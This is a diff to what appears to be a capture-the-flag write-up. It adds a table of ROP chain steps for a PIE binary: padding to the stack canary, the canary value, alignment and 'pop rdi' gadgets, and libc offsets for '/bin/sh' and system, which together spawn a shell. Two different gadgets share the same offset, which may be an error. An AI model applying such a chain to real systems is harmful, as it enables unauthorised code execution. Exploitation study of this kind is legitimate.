@@ -372,6 +372,20 @@ Since the binary is PIE and its base address is unknown, gadgets in `fire-exting
 
 ### Manual
 
+Steps
+
+| Step | Purpose                 | Value                     |
+| ---- | ----------------------- | ------------------------- |
+| 1    | Padding to Canary       | `104`                     |
+| 2    | Canary                  | Canary Address at Runtime |
+| 3    | Padding to RBP          | `8`                       |
+| 4    | Stack alignment (`ret`) | `libc_base + 0x2846b`     |
+| 5    | `pop rdi; ret;`         | `libc_base + 0x2846b`     |
+| 6    | `/bin/sh`               | `libc_base + 0x1a7ea4`    |
+| 7    | `system`                | `libc_base + 0x53110`     |
+
+> Also, don't forget LIBC Leak.
+
 Make changes to "CHANGE ME" section
 
 ```python
